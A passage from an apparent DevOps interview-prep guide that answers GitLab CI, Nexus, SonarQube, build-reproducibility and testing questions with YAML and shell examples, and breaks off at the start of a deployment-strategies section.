1. GitHub natively skips `push`/`pull_request` runs when the head commit message has `[skip ci]`, `[ci skip]`, `[no ci]`, `[skip actions]` or `[actions skip]`.
2. For finer control add `if: "!contains(github.event.head_commit.message, '[skip release]')"`.

**Why →** The native keywords skip workflows without extra code.

**Interview tip →** Skipped required checks can block merges; use sparingly on protected branches.

</details>

---

## GitLab CI

<!-- DEVOPS-SHACK:SECTION -->
> 🎥 **Learn this hands-on with DevOps Shack** → [YouTube @devopsshack](https://www.youtube.com/@devopsshack) · [Hindi @shackverse](https://www.youtube.com/@shackverse) · [Courses at devopsshack.com](https://devopsshack.com)

### Q101. Write a basic `.gitlab-ci.yml` with build, test and deploy stages where deploy only runs on main. 🟢

<details>
<summary><b>Answer</b></summary>

**Situation read →** Standard staged pipeline.

**What I'd do →**
```yaml
stages: [build, test, deploy]

build:
  stage: build
  image: node:22
  script: [npm ci, npm run build]
  artifacts: { paths: [dist/], expire_in: 1 week }

test:
  stage: test
  image: node:22
  script: [npm ci, npm test]

deploy:
  stage: deploy
  script: ./deploy.sh
  rules:
    - if: $CI_COMMIT_BRANCH == $CI_DEFAULT_BRANCH
```

**Why →** `rules` replaced `only/except`, and artifacts from earlier stages are downloaded automatically.

**Interview tip →** Use `rules`, not `only/except`; the latter is legacy.

</details>

### Q102. Pipelines run twice for merge request branches: a branch pipeline and an MR pipeline. 🟡

<details>
<summary><b>Answer</b></summary>

**Situation read →** Duplicate pipelines from overlapping triggers.

**What I'd do →**
1. Use the recommended workflow rules:
```yaml
workflow:
  rules:
    - if: $CI_PIPELINE_SOURCE == "merge_request_event"
    - if: $CI_COMMIT_BRANCH && $CI_OPEN_MERGE_REQUESTS
      when: never
    - if: $CI_COMMIT_BRANCH
```
2. Confirm results with the pipeline source in the UI.

**Why →** Branch pipelines are suppressed when an MR is open, so only one pipeline runs.

**Interview tip →** Know `CI_PIPELINE_SOURCE` values.

</details>

### Q103. Jobs in later stages wait for the whole earlier stage even if their dependency finished. 🟡

<details>
<summary><b>Answer</b></summary>

**Situation read →** Stage ordering hides a DAG.

**What I'd do →**
1. Add `needs:` to jobs: `needs: [build-api]` so they start as soon as the dependency finishes.
2. Add `needs: { job: build, artifacts: false }` when artifacts are not needed.
3. Keep stages for readability.

**Why →** DAG pipelines cut critical path time.

**Interview tip →** `needs` also controls which artifacts are downloaded.

</details>

### Q104. Production deploy needs manual trigger and the environment must show up in GitLab's Environments page. 🟢

<details>
<summary><b>Answer</b></summary>

**Situation read →** Manual gated deploy with environment tracking.

**What I'd do →**
```yaml
deploy_prod:
  stage: deploy
  script: ./deploy.sh prod
  environment:
    name: production
    url: https://app.example.com
  rules:
    - if: $CI_COMMIT_BRANCH == $CI_DEFAULT_BRANCH
      when: manual
```
Protect the `production` environment so only certain roles can deploy.

**Why →** Protected environments enforce who may run the manual job.

**Interview tip →** Mention `allow_failure: false` on manual jobs to block the pipeline until it is run.

</details>

### Q105. A GitLab job needs to push a Docker image without Docker-in-Docker privileges. 🟡

<details>
<summary><b>Answer</b></summary>

**Situation read →** DinD needs privileged runners.

**What I'd do →**
1. Use Kaniko or BuildKit rootless in the job image:
```yaml
build_image:
  image: { name: gcr.io/kaniko-project/executor:debug, entrypoint: [""] }
  script:
    - /kaniko/executor --context $CI_PROJECT_DIR --dockerfile Dockerfile
      --destination $CI_REGISTRY_IMAGE:$CI_COMMIT_SHORT_SHA
```
2. Authenticate using `$CI_REGISTRY_USER` and `$CI_REGISTRY_PASSWORD` written to `/kaniko/.docker/config.json`.

**Why →** No privileged container and no Docker socket on the runner.

**Interview tip →** Compare with `docker:dind` plus `DOCKER_TLS_CERTDIR`.

</details>

### Q106. Shared CI logic for 40 projects needs central control. 🟡

<details>
<summary><b>Answer</b></summary>

**Situation read →** Template reuse.

**What I'd do →**
1. Store templates in a central project and include them: `include: - project: platform/ci-templates ref: v3.2.0 file: /templates/build.yml`.
2. Use `extends:` and hidden `.base` jobs, and `inputs` with `spec:inputs` for parameterisation.
3. Enforce mandatory jobs with compliance pipelines or pipeline execution policies.

**Why →** Pinning `ref` gives safe versioned rollout.

**Interview tip →** Know `include:local|project|remote|template|component` and CI/CD components.

</details>

### Q107. Test jobs take long; you want to split a test suite across 5 parallel runners. 🟢

<details>
<summary><b>Answer</b></summary>

**Situation read →** Test sharding.

**What I'd do →**
```yaml
test:
  parallel: 5
  script: ./run-tests.sh --shard $CI_NODE_INDEX/$CI_NODE_TOTAL
```
Use `parallel: matrix:` for variants like OS or version.

**Why →** GitLab starts five jobs and provides `CI_NODE_INDEX` and `CI_NODE_TOTAL`.

**Interview tip →** Balance shards by historical timing to avoid a slow straggler.

</details>

### Q108. Builds download npm packages each time. Configure caching correctly in GitLab. 🟢

<details>
<summary><b>Answer</b></summary>

**Situation read →** Cache vs artifacts confusion.

**What I'd do →**
```yaml
cache:
  key:
    files: [package-lock.json]
  paths: [.npm/]
  policy: pull-push
variables:
  npm_config_cache: "$CI_PROJECT_DIR/.npm"
```
Use `policy: pull` in jobs that only read.

**Why →** Caches speed up dependencies and are best-effort; artifacts pass results between jobs.

**Interview tip →** Cache is not guaranteed; the build must still work without it.

</details>

### Q109. The security team wants SAST, dependency scanning and secret detection on every project without copy-paste. 🟡

<details>
<summary><b>Answer</b></summary>

**Situation read →** Standard scanners as policy.

**What I'd do →**
1. Include GitLab's templates: `Security/SAST.gitlab-ci.yml`, `Security/Dependency-Scanning.gitlab-ci.yml`, `Security/Secret-Detection.gitlab-ci.yml`.
2. Enforce them through a scan execution policy so projects cannot remove them.
3. Review findings in the Vulnerability Report and set merge request approval rules for critical findings.

**Why →** Policies apply org-wide and survive edits to `.gitlab-ci.yml`.

**Interview tip →** Some scanners need Ultimate tier; know the free alternatives (Trivy, Semgrep, gitleaks).

</details>

### Q110. You need multi-project pipelines: when the API repo changes, trigger the frontend pipeline. 🟡

<details>
<summary><b>Answer</b></summary>

**Situation read →** Cross-repo orchestration.

**What I'd do →**
```yaml
trigger_frontend:
  stage: deploy
  trigger:
    project: group/frontend
    branch: main
    strategy: depend
```
`strategy: depend` makes the upstream job wait for the downstream result.

**Why →** Upstream status reflects the downstream outcome, giving one place to look.

**Interview tip →** Contrast parent-child pipelines (same project) with multi-project pipelines.

</details>

### Q111. A monorepo needs different pipelines per service, only when that service changes. 🟡

<details>
<summary><b>Answer</b></summary>

**Situation read →** Dynamic or child pipelines.

**What I'd do →**
1. Use `rules:changes` with `paths:` and `compare_to: refs/heads/main`.
2. For each service trigger a child pipeline: `trigger: include: services/api/.gitlab-ci.yml`.
3. For very dynamic cases, generate YAML in one job and run it via `trigger: include: artifact: ci.yml, job: generate`.

**Why →** Child pipelines keep each service's config small and isolated.

**Interview tip →** `rules:changes` on branch pipelines without `compare_to` always evaluates true on new branches.

</details>

### Q112. Runners are shared and one team needs dedicated, tagged runners with a specific network. 🟡

<details>
<summary><b>Answer</b></summary>

**Situation read →** Runner scoping.

**What I'd do →**
1. Register a group or project runner with tags (`team-a`, `vpc-private`) and "run untagged jobs" disabled.
2. Select with `tags: [team-a]` in jobs.
3. For autoscaling use the Kubernetes executor or Docker autoscaler, with `concurrent` and `check_interval` tuned.

**Why →** Tags route jobs to the right network and capacity.

**Interview tip →** Registration uses authentication tokens now, created in the UI, not the legacy registration token.

</details>

### Q113. Secrets: deploy jobs need a database password, and it must not leak from MR pipelines. 🟡

<details>
<summary><b>Answer</b></summary>

**Situation read →** CI/CD variables scoping.

**What I'd do →**
1. Add the variable as masked, hidden, and protected, scoped to environment `production`.
2. Protected variables are only exposed to pipelines on protected branches/tags.
3. Prefer external secrets: Vault via `secrets:` keyword with `id_tokens` (OIDC JWT) instead of storing the value.

**Why →** MR pipelines from unprotected branches cannot read protected variables.

**Interview tip →** Masking requires value rules (length, characters); mention that limitation.

</details>

### Q114. How do you authenticate GitLab CI to AWS without storing keys? 🔴

<details>
<summary><b>Answer</b></summary>

**Situation read →** OIDC federation.

**What I'd do →**
1. Declare `id_tokens: { AWS_TOKEN: { aud: https://gitlab.example.com } }` in the job.
2. Create an IAM OIDC provider for the GitLab issuer and a role whose trust policy matches `sub` like `project_path:group/app:ref_type:branch:ref:main`.
3. In the script: `aws sts assume-role-with-web-identity --role-arn $ROLE --role-session-name ci --web-identity-token "$AWS_TOKEN"`.

**Why →** Tokens are short-lived and identity-bound.

**Interview tip →** Same pattern as GitHub Actions OIDC.

</details>

### Q115. A deploy to a Kubernetes cluster from GitLab: agent or kubeconfig? 🔴

<details>
<summary><b>Answer</b></summary>

**Situation read →** Cluster connectivity choice.

**What I'd do →**
1. Prefer the GitLab agent for Kubernetes: the in-cluster agent opens an outbound tunnel, so no cluster API exposure to runners.
2. Grant CI access with `ci_access` in the agent config, and bind to namespaced RBAC.
3. In jobs: `kubectl config use-context group/project:agent-name` then `kubectl apply`.
4. Or use pull-based GitOps with Flux and the agent's Flux integration.

**Why →** Outbound-only connections are safer than kubeconfig secrets in CI.

**Interview tip →** Push CI deploy vs pull GitOps is a standard trade-off question.

</details>

### Q116. Teams need review apps for every MR and auto-stop when the MR closes. 🟡

<details>
<summary><b>Answer</b></summary>

**Situation read →** Dynamic environments.

**What I'd do →**
```yaml
review:
  script: ./deploy-review.sh $CI_ENVIRONMENT_SLUG
  environment:
    name: review/$CI_COMMIT_REF_SLUG
    url: https://$CI_ENVIRONMENT_SLUG.review.example.com
    on_stop: stop_review
    auto_stop_in: 3 days
  rules: [{ if: $CI_PIPELINE_SOURCE == "merge_request_event" }]
stop_review:
  script: ./teardown.sh $CI_ENVIRONMENT_SLUG
  environment: { name: review/$CI_COMMIT_REF_SLUG, action: stop }
  when: manual
```

**Why →** `auto_stop_in` and `on_stop` prevent orphaned environments.

**Interview tip →** Always pair environment creation with a stop path.

</details>

### Q117. You want to include a slow security scan only on a nightly schedule. 🟢

<details>
<summary><b>Answer</b></summary>

**Situation read →** Schedule-specific jobs.

**What I'd do →**
1. Create a pipeline schedule (CI/CD > Schedules) with cron `0 2 * * *`.
2. In the job: `rules: - if: $CI_PIPELINE_SOURCE == "schedule"`.
3. Set a schedule variable like `FULL_SCAN=true` if needed.

**Why →** Heavy scans stay off the fast feedback path.

**Interview tip →** Keep a quick scan on MRs and the full scan nightly.

</details>

### Q118. A job must run with a specific Docker image and connect to a service container. 🟢

<details>
<summary><b>Answer</b></summary>

**Situation read →** Services in GitLab.

**What I'd do →**
```yaml
test:
  image: python:3.12
  services:
    - name: postgres:16
      alias: db
  variables:
    POSTGRES_PASSWORD: test
    DATABASE_URL: postgresql://postgres:test@db:5432/postgres
  script: pytest
```

**Why →** Services are reachable via their alias hostname on the job network.

**Interview tip →** Add a readiness wait; the service may not be accepting connections when the script starts.

</details>

### Q119. Merge requests may only merge if the pipeline succeeds and a security approver signs off for critical findings. 🟡

<details>
<summary><b>Answer</b></summary>

**Situation read →** MR governance.

**What I'd do →**
1. Enable "Pipelines must succeed" in merge settings.
2. Add approval rules, including a security-scanner-triggered rule for new critical vulnerabilities.
3. Use CODEOWNERS sections for sensitive paths with required approvals.
4. Use merge trains to avoid semantic conflicts on busy branches.

**Why →** Policy enforced at merge time covers everyone consistently.

**Interview tip →** Merge trains test each MR on top of the queue.

</details>

### Q120. A job must be retried automatically on runner failure but not on test failure. 🟡

<details>
<summary><b>Answer</b></summary>

**Situation read →** Selective retry.

**What I'd do →**
```yaml
test:
  retry:
    max: 2
    when: [runner_system_failure, stuck_or_timeout_failure]
```

**Why →** Infrastructure failures are transient; real test failures should surface immediately.

**Interview tip →** `retry:when` avoids hiding genuine failures.

</details>

### Q121. How do you keep the pipeline fast when the default branch has 200 commits a day? 🔴

<details>
<summary><b>Answer</b></summary>

**Situation read →** High pipeline concurrency and queue pressure.

**What I'd do →**
1. `interruptible: true` on jobs and enable "auto-cancel redundant pipelines" so superseded commits stop.
2. Use merge trains/queues and `needs` DAG.
3. Autoscale runners, use shallow clones (`GIT_DEPTH: 20`) and fetch strategy `GIT_STRATEGY: fetch` on persistent runners.
4. Cache aggressively and shard tests.

**Why →** Cancelling stale work and shortening the critical path improves developer wait time.

**Interview tip →** Do not mark deploy jobs interruptible.

</details>

### Q122. Compliance requires that every pipeline run a license scan that teams cannot disable. 🔴

<details>
<summary><b>Answer</b></summary>

**Situation read →** Non-removable pipeline stages.

**What I'd do →**
1. Use pipeline execution policies (or compliance frameworks with compliance pipelines) to inject the job from a central project.
2. Restrict who may edit the policy project.
3. Block merges on policy violations via merge request approval policies.

**Why →** Controls injected from outside the project cannot be deleted by project maintainers.

**Interview tip →** Same principle as the Jenkins golden pipeline.

</details>

### Q123. You have to publish a Maven package to GitLab's package registry from CI. 🟡

<details>
<summary><b>Answer</b></summary>

**Situation read →** Use the built-in registry with job token.

**What I'd do →**
1. Configure `distributionManagement` pointing to `${CI_API_V4_URL}/projects/${CI_PROJECT_ID}/packages/maven`.
2. Add a `settings.xml` server with header `Job-Token` and value `${env.CI_JOB_TOKEN}`.
3. Run `mvn deploy -s ci_settings.xml`.

**Why →** The job token is short-lived and scoped to the pipeline.

**Interview tip →** Know that `CI_JOB_TOKEN` access to other projects is allow-list based.

</details>

### Q124. A scheduled pipeline should skip when there are no changes, and only specific users can manually run production jobs. 🟡

<details>
<summary><b>Answer</b></summary>

**Situation read →** Control triggers and actors.

**What I'd do →**
1. Combine `rules:changes` with `$CI_PIPELINE_SOURCE == "schedule"` where needed.
2. Mark `production` as a protected environment with allowed deployers and optional approvals.
3. Restrict who can run manual jobs by protecting the branch and environment.

**Why →** Roles are enforced by the platform, not by job code.

**Interview tip →** Protected environments support multi-approver rules.

</details>

### Q125. A shared runner executes jobs from untrusted forks. What are the risks and mitigations? 🔴

<details>
<summary><b>Answer</b></summary>

**Situation read →** External code on shared infrastructure.

**What I'd do →**
1. Run fork MR pipelines only after maintainer approval, and do not expose protected variables to them.
2. Use ephemeral, isolated runners (Kubernetes pods or autoscaled VMs), no Docker socket binding, and no privileged mode.
3. Restrict network egress from runners and avoid long-lived credentials on runner hosts.

**Why →** CI runners execute arbitrary code by design.

**Interview tip →** Mention "runner is the trust boundary".

</details>

---

## Builds, Artifacts, Nexus, SonarQube and Testing

<!-- DEVOPS-SHACK:SECTION -->
> 🎥 **Learn this hands-on with DevOps Shack** → [YouTube @devopsshack](https://www.youtube.com/@devopsshack) · [Hindi @shackverse](https://www.youtube.com/@shackverse) · [Courses at devopsshack.com](https://devopsshack.com)

### Q126. A Maven project resolves dependencies from Maven Central on every build and a left-pad style outage would stop all builds. 🟢

<details>
<summary><b>Answer</b></summary>

**Situation read →** Direct dependency on a public registry.

**What I'd do →**
1. Run Nexus Repository with a `maven-central` proxy repo and a `maven-public` group repo.
2. Add a mirror in `settings.xml`:
```xml
<mirror>
  <id>nexus</id>
  <mirrorOf>*</mirrorOf>
  <url>https://nexus.example.com/repository/maven-public/</url>
</mirror>
```
3. Give CI a read-only account and restrict outbound internet from agents.

**Why →** Cached artifacts keep builds working during outages and give you one audit point.

**Interview tip →** `mirrorOf *` sends all requests through Nexus.

</details>

### Q127. You must publish snapshot and release artifacts without overwriting a released version. 🟡

<details>
<summary><b>Answer</b></summary>

**Situation read →** Release immutability.

**What I'd do →**
1. Create separate Nexus hosted repos: `maven-snapshots` (version policy Snapshot) and `maven-releases` (Release, deployment policy "Disable redeploy").
2. Configure `distributionManagement` in the POM for both and use `mvn deploy`.
3. Use CI credentials with deploy rights only on those repos.

**Why →** A released version that can change breaks reproducibility and trust.

**Interview tip →** "Released artifacts are immutable; snapshots are not."

</details>

### Q128. Every merge to main should produce a unique semantic version automatically. 🟡

<details>
<summary><b>Answer</b></summary>

**Situation read →** Versioning without manual edits.

**What I'd do →**
1. Adopt Conventional Commits and a tool like `semantic-release` or `release-please` to compute the next version from commit types.
2. Tag, publish the artifact and create release notes in the same pipeline.
3. For services, also tag images with `<semver>` and the commit SHA.

**Why →** Version numbers become a function of history, removing human error.

**Interview tip →** Squash-merge with a good PR title keeps commit-based versioning clean.

</details>

### Q129. An npm build is non-reproducible: different versions install on different days. 🟢

<details>
<summary><b>Answer</b></summary>

**Situation read →** Missing or ignored lockfile.

**What I'd do →**
1. Commit `package-lock.json` and use `npm ci` in CI, which fails if the lockfile and `package.json` disagree.
2. Pin the Node version (`.nvmrc` or `engines`).
3. Point `.npmrc` at the Nexus npm proxy.

**Why →** `npm ci` installs exactly what is locked and wipes `node_modules` first.

**Interview tip →** `npm install` may rewrite the lockfile; `npm ci` never does.

</details>

### Q130. The SonarQube quality gate must block merging PRs that add new bugs, vulnerabilities or uncovered code. 🟡

<details>
<summary><b>Answer</b></summary>

**Situation read →** Gate on new code, not the legacy backlog.

**What I'd do →**
1. Define the gate on "Clean as You Code" conditions: no new bugs/vulnerabilities, coverage on new code at least 80%, duplications on new code under 3%.
2. In CI run the scanner with `-Dsonar.qualitygate.wait=true` so the step fails on a failed gate.
3. Decorate the PR and make the Sonar check required.

**Why →** New-code gating prevents debt from growing without demanding a big-bang cleanup.

**Interview tip →** Mention "Clean as You Code".

</details>

### Q131. Coverage shows 0% in SonarQube although tests run in CI. 🟡

<details>
<summary><b>Answer</b></summary>

**Situation read →** The scanner cannot find the coverage report.

**What I'd do →**
1. Generate the report before the scan (JaCoCo XML, `lcov.info`, `coverage.xml`).
2. Pass its path: `-Dsonar.coverage.jacoco.xmlReportPaths=target/site/jacoco/jacoco.xml` or `-Dsonar.javascript.lcov.reportPaths=coverage/lcov.info`.
3. Make sure the scanner runs in the same workspace after tests and with matching source paths.

**Why →** SonarQube imports coverage; it does not compute it.

**Interview tip →** Path mismatches inside containers are the common cause.

</details>

### Q132. A big legacy codebase fails every Sonar gate. Teams ignore the tool. How do you adopt it? 🟡

<details>
<summary><b>Answer</b></summary>

**Situation read →** Adoption by overwhelming the team.

**What I'd do →**
1. Set the new code definition to "since a recent date/previous version" and enforce the gate only on new code.
2. Triage the top critical issues and security hotspots with owners.
3. Gradually tighten thresholds each quarter and publish trend dashboards.

**Why →** Developers accept rules that apply to changes they control.

**Interview tip →** Do not demand zero legacy issues.

</details>

### Q133. Integration tests are slow and flaky because they share one QA database. 🟡

<details>
<summary><b>Answer</b></summary>

**Situation read →** Shared mutable state.

**What I'd do →**
1. Switch to per-run isolated dependencies with Testcontainers or service containers.
2. Seed using migrations (Flyway/Liquibase) so schema changes are tested too.
3. Make tests independent: unique data per test and no order assumptions.

**Why →** Isolation removes interference between runs and makes failures reproducible.

**Interview tip →** Testing migrations in CI catches broken schema changes early.

</details>

### Q134. How do you structure test stages so developers get fast feedback but you still get deep coverage? 🟢

<details>
<summary><b>Answer</b></summary>

**Situation read →** Test pyramid in the pipeline.

**What I'd do →**
1. On every push: lint, unit tests and build (minutes).
2. On PR: add integration tests and a quick security scan.
3. Post-merge or nightly: full end-to-end, performance and long scans.
4. After deploy: smoke tests against the live environment.

**Why →** Fast tests gate every change, and slow tests run where their cost is justified.

**Interview tip →** Describe the pipeline as feedback loops of increasing cost.

</details>

### Q135. A team has a test suite where 5% of tests fail randomly. How do you deal with flaky tests? 🟡

<details>
<summary><b>Answer</b></summary>

**Situation read →** Flakiness erodes trust in CI.

**What I'd do →**
1. Detect: track pass/fail history per test and flag those that flip with no code change.
2. Quarantine: move flaky tests to a non-blocking job with an owner and ticket.
3. Fix root causes: shared state, time, ordering, network, async waits.
4. Do not auto-retry everything; allow limited retry that is reported.

**Why →** Silent retries hide problems while quarantine keeps the gate trustworthy.

**Interview tip →** Report flaky rate as a metric.

</details>

### Q136. You need to publish a Docker image to Nexus and also keep a copy of base images internally. 🟡

<details>
<summary><b>Answer</b></summary>

**Situation read →** Private registry plus proxy.

**What I'd do →**
1. Create a Docker hosted repo for your images and a Docker proxy repo for Docker Hub, grouped under one endpoint.
2. Configure CI to pull base images from the proxy; set `FROM nexus.example.com/library/node:22`.
3. Add cleanup policies to expire old tags and run the compact blob store task.

**Why →** This avoids Docker Hub rate limits and gives control over upstream images.

**Interview tip →** Cleanup policies stop storage from growing without bound.

</details>

### Q137. The Maven build is slow on multi-module projects. 🟡

<details>
<summary><b>Answer</b></summary>

**Situation read →** Serial modules and repeated work.

**What I'd do →**
1. Build in parallel with `mvn -T 1C -B verify`.
2. Skip unchanged modules with `-pl` and `-amd` (also-make-dependents) based on the change set.
3. Separate fast unit tests from slow integration tests (Surefire vs Failsafe).
4. Use the Maven daemon (`mvnd`) locally and a dependency proxy in CI.

**Why →** Parallelism and building only what is affected gives most of the gain.

**Interview tip →** `-amd` and `-pl` show Maven fluency.

</details>

### Q138. A security policy demands every build records a list of its dependencies. 🔴

<details>
<summary><b>Answer</b></summary>

**Situation read →** SBOM generation.

**What I'd do →**
1. Generate an SBOM in CI: `syft packages dir:. -o cyclonedx-json > sbom.json` or the CycloneDX Maven/npm plugins.
2. Attach it to the build as an artifact and attest it to the image with `cosign attest`.
3. Scan the SBOM with Grype or Dependency-Track continuously.

**Why →** An SBOM lets you answer "are we affected?" within minutes when a new CVE drops.

**Interview tip →** Log4Shell is the usual motivating example.

</details>

### Q139. You want to fail the build on high-severity vulnerabilities in a container image. 🟢

<details>
<summary><b>Answer</b></summary>

**Situation read →** Image scanning gate.

**What I'd do →**
```bash
trivy image --severity HIGH,CRITICAL --ignore-unfixed --exit-code 1 app:$TAG
```
Add a `.trivyignore` with expiry-dated, reviewed exceptions.

**Why →** `--ignore-unfixed` avoids blocking on issues with no available fix, and the exit code fails the step.

**Interview tip →** Exceptions need an owner and an expiry.

</details>

### Q140. Artifacts in Nexus consume 5 TB and keep growing. 🟡

<details>
<summary><b>Answer</b></summary>

**Situation read →** No lifecycle policy.

**What I'd do →**
1. Create cleanup policies: delete snapshots older than 30 days, keep the last N, delete unreferenced Docker layers.
2. Schedule "Admin - Compact blob store" and "Docker - Delete unused manifests and images" tasks.
3. Set blob store quotas and alerts, and keep release artifacts by policy only.

**Why →** Deleting components does not free space until the blob store is compacted.

**Interview tip →** Cleanup policy plus compact task is the pair to mention.

</details>

### Q141. A Gradle or Maven build must be reproducible byte for byte. What do you do? 🔴

<details>
<summary><b>Answer</b></summary>

**Situation read →** Timestamps and ordering make artifacts differ.

**What I'd do →**
1. Set `project.build.outputTimestamp` in Maven (or `preserveFileTimestamps = false` and `reproducibleFileOrder = true` in Gradle archive tasks).
2. Pin the JDK and tool versions, build in a pinned container, and lock dependencies.
3. Verify by building twice and comparing digests (`sha256sum`) or using `diffoscope`.

**Why →** Reproducible builds let third parties verify that binaries match the source.

**Interview tip →** Mention SLSA and the verification step.

</details>

### Q142. Developers run `mvn deploy` locally and push artifacts that CI never built. 🔴

<details>
<summary><b>Answer</b></summary>

**Situation read →** Artifact provenance gap.

**What I'd do →**
1. Remove deploy credentials from developers; only the CI service account can write to release repos.
2. Developers may write to a separate sandbox/snapshot repo if needed.
3. Add provenance metadata and verify it before promotion.

**Why →** Production artifacts must come from a controlled, auditable build.

**Interview tip →** Separate who can build from who can publish.

</details>

### Q143. Tests need secrets (API keys for a sandbox). How do you provide them safely in CI? 🟡

<details>
<summary><b>Answer</b></summary>

**Situation read →** Test-time secrets.

**What I'd do →**
1. Use dedicated sandbox keys with minimal scope and a rotation schedule.
2. Inject at runtime through the CI secret store/Vault, not committed `.env` files.
3. Block secret availability on fork PRs.
4. Prefer mocks or contract tests where the real service is not needed.

**Why →** Test credentials are still credentials and still leak.

**Interview tip →** Contract tests (Pact) reduce reliance on live third parties.

</details>

### Q144. How would you add performance regression detection to CI without making it flaky? 🔴

<details>
<summary><b>Answer</b></summary>

**Situation read →** Noisy benchmarks on shared runners.

**What I'd do →**
1. Run load tests (k6 or Gatling) against a dedicated, stable environment nightly, not on every PR.
2. Compare to a moving baseline with thresholds (`thresholds: { http_req_duration: ['p(95)<300'] }` in k6).
3. Track trends in a time-series dashboard and alert on sustained regressions.

**Why →** Shared CI hardware is too noisy for strict per-PR performance gates.

**Interview tip →** Say you gate on trends and percentiles, not single runs.

</details>

### Q145. A Docker build step takes 15 minutes because layers are rebuilt every time. 🟢

<details>
<summary><b>Answer</b></summary>

**Situation read →** Poor layer ordering or no cache on ephemeral runners.

**What I'd do →**
1. Order the Dockerfile so rarely changing steps come first: copy lockfile, install dependencies, then copy source.
2. Use multi-stage builds and `.dockerignore`.
3. Export/import cache: `--cache-to type=registry,ref=...` and `--cache-from`.

**Why →** Ephemeral agents have no local cache, so a remote cache restores the benefit.

**Interview tip →** Layer order is the cheapest optimisation.

</details>

### Q146. Mobile or desktop app builds need signing certificates in CI. 🟡

<details>
<summary><b>Answer</b></summary>

**Situation read →** Protecting signing keys.

**What I'd do →**
1. Store the keystore as an encrypted secret and decode it to a temp file in the job, deleting it afterwards.
2. Restrict signing to release branches/tags on protected, ephemeral runners.
3. Use cloud HSM/KMS-backed signing where possible.

**Why →** A leaked signing key lets attackers publish trusted malicious builds.

**Interview tip →** Separate the "build" job from a narrowly scoped "sign" job.

</details>

### Q147. Developers ask whether to use a mono-repo or many repos for CI purposes. 🔴

<details>
<summary><b>Answer</b></summary>

**Situation read →** An architectural decision with CI consequences.

**What I'd do →**
1. Mono-repo: atomic cross-service changes and shared tooling, but requires change detection, caching, ownership rules (CODEOWNERS) and a build system that scales.
2. Poly-repo: independent pipelines and permissions, but dependency version drift and cross-repo changes are harder.
3. Choose based on team structure and release independence.

**Why →** CI cost model and org boundaries should drive the decision.

**Interview tip →** Mention Conway's law.

</details>

### Q148. A build uses `latest` tags for base images and suddenly breaks without code changes. 🟢

<details>
<summary><b>Answer</b></summary>

**Situation read →** Unpinned inputs.

**What I'd do →**
1. Pin base images by version and digest: `FROM node:22.11-slim@sha256:...`.
2. Let Renovate or Dependabot open PRs to bump them.
3. Pin tool versions in the pipeline too.

**Why →** Controlled upgrades turn surprise breakages into reviewable PRs.

**Interview tip →** Pinning plus automated updates is the balanced answer.

</details>

### Q149. Integration test environment is expensive and idle at night. 🟡

<details>
<summary><b>Answer</b></summary>

**Situation read →** Always-on cost.

**What I'd do →**
1. Create environments on demand with IaC (Terraform/Helm) inside the pipeline and destroy at the end.
2. For shared environments schedule scale-down (KEDA, cron-scaling, or stopping instances).
3. Use ephemeral namespaces on a shared cluster with resource quotas.

**Why →** Pay for the environment only while tests run.

**Interview tip →** Cost is part of CI/CD design.

</details>

### Q150. You must ensure unit tests, not just a green build, are present for every new class. 🟡

<details>
<summary><b>Answer</b></summary>

**Situation read →** Quality enforcement.

**What I'd do →**
1. Enforce coverage on new code with Sonar or `diff-cover` (`diff-cover coverage.xml --fail-under=80`).
2. Add mutation testing (PIT, Stryker) on critical modules nightly.
3. Use PR templates and review checklists as complements.

**Why →** Coverage on changed lines focuses effort, and mutation tests check assertion quality.

**Interview tip →** High coverage without assertions is a vanity metric.

</details>

### Q151. A team needs to build the same Java app for multiple JDK versions. 🟢

<details>
<summary><b>Answer</b></summary>

**Situation read →** Compatibility testing.

**What I'd do →**
1. Use Maven toolchains or CI matrix (`jdk: [17, 21]`), compiling with a fixed release flag (`maven.compiler.release=17`).
2. Run tests on each JDK; ship the artifact built on the baseline.

**Why →** `release` ensures API compatibility, and the matrix proves runtime behaviour.

**Interview tip →** Release only one artifact; test on many.

</details>

### Q152. How do you prove to auditors that a given production artifact passed all pipeline checks? 🔴

<details>
<summary><b>Answer</b></summary>

**Situation read →** Evidence trail.

**What I'd do →**
1. Store test reports, scan results, SBOM and approvals as attestations linked to the artifact digest.
2. Retain pipeline logs and metadata for the required period in a write-once store.
3. Tag deployments with commit, build URL and approver, and verify attestations in admission control.

**Why →** Evidence tied to an immutable digest is hard to dispute.

**Interview tip →** Digest-based traceability.

</details>

### Q153. CI reports "Quality gate passed" but a critical vulnerability reached production through a transitive dependency. 🔴

<details>
<summary><b>Answer</b></summary>

**Situation read →** Gaps in dependency scanning and runtime monitoring.

**What I'd do →**
1. Add SCA (Trivy, OWASP Dependency-Check, Snyk) on every build and nightly against the main branch, since new CVEs appear after merge.
2. Keep SBOMs per release in Dependency-Track and alert on new matches.
3. Define SLAs for patching by severity and use Renovate for upgrades.

**Why →** A scan at build time cannot see vulnerabilities disclosed tomorrow.

**Interview tip →** "Shift left and keep watching."

</details>

### Q154. A frontend build must publish static assets to S3 and invalidate CloudFront safely. 🟡

<details>
<summary><b>Answer</b></summary>

**Situation read →** Static deploy with cache control.

**What I'd do →**
1. Build with hashed filenames; upload assets with long cache headers: `aws s3 sync dist/ s3://bucket --cache-control "public,max-age=31536000,immutable" --exclude index.html`.
2. Upload `index.html` last with `no-cache`.
3. Invalidate only `/index.html` or the changed paths: `aws cloudfront create-invalidation --distribution-id $ID --paths /index.html`.

**Why →** Hashed assets never need invalidation, which is faster and cheaper.

**Interview tip →** Upload order prevents broken pages mid-deploy.

</details>

### Q155. Developers use different local tool versions than CI. How do you align them? 🟢

<details>
<summary><b>Answer</b></summary>

**Situation read →** Environment drift.

**What I'd do →**
1. Define tool versions in one place: `.tool-versions` (asdf/mise), devcontainers, or a shared build image.
2. Use the same image for local `docker run` and CI jobs.
3. Verify with a CI step that prints versions.

**Why →** Identical toolchains remove a large class of "works on my machine".

**Interview tip →** Devcontainers are the modern answer.

</details>

---

## Deployment Strategies and GitOps

<!-- DEVOPS-SHACK:SECTION -->
> 🎥 **Learn this hands-on with DevOps Shack** → [YouTube @devopsshack](https://www.youtube.com/@devopsshack) · [Hindi @shackverse](https://www.youtube.com/@shackverse) · [Courses at devopsshack.com](https://devopsshack.com)

### Q156. You are asked to explain rolling, blue-green and canary to the product team and pick one for a payments API. 🟢

<details>
<summary><b>Answer</b></summary>

**Situation read →** Choose a strategy by risk and cost.

**What I'd do →**
1. Rolling: replace instances gradually; cheap, but old and new versions coexist.
2. Blue-green: full parallel environment, instant switch and rollback; double capacity cost.
3. Canary: shift 1% → 10% → 50% with metric checks; lowest blast radius.
